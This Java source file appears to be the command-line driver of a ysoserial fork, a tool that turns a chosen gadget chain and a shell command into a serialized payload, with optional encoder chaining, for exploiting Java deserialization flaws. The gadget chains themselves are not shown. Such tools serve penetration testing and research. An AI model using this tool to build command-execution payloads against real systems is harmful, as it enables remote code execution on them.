package org.erosion2020;

import org.erosion2020.encoder.EncoderFactory;
import org.erosion2020.payloads.ObjectPayload;
import org.erosion2020.payloads.ObjectPayload.Utils;
import org.erosion2020.payloads.annotation.Authors;
import org.erosion2020.payloads.annotation.Dependencies;

import org.slf4j.LoggerFactory;
import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.Logger;

import java.io.PrintStream;
import java.util.*;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	static {
		// 关闭 ROOT 日志（Logback）
		Logger root = (Logger) LoggerFactory.getLogger(org.slf4j.Logger.ROOT_LOGGER_NAME);
		root.setLevel(Level.OFF);
	}

	public static void main(final String[] args) {
		if (args.length != 2 && args.length != 3) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String command = args[1];

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			if(args.length == 3) {
				String config = args[2];
				EncoderFactory.process(config, object);
			}else {
				PrintStream out = System.out;
				Serializer.serialize(object, out);
			}
			Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Do you Process Ysoserial Chain?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' '[encoder1->encoder2->print]'");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
